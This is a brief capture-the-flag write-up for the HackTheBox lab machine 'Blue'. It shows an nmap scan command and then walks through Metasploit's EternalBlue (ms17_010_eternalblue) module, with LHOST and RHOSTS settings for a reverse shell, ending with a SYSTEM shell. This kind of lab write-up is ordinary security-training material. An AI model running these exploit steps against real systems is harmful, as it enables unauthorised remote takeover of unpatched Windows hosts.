# **Description**

Hello hackers, I hope you are doing well. We are doing [Blue](https://app.hackthebox.com/machines/Blue) from [HackTheBox](https://www.hackthebox.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.40 (10.10.10.40)
Host is up (0.14s latency).

```

We have a windows machine with SMB open, as well as other things.

# **Foothold**

Since the machine is named `Blue` and we have a windows machine, i directly though of the Eternal-Blue exploit.

Let's fire up `Metasploit` and use the `ms17_010_eternalblue` module.

![](1.png)

Now we need to set the required option.

```
set LHOST tun0

set rhosts 10.10.10.40
```

Type `exploit` to run the module.

Great! We got a shell, and we're Authority System so no need for privilege escalation.
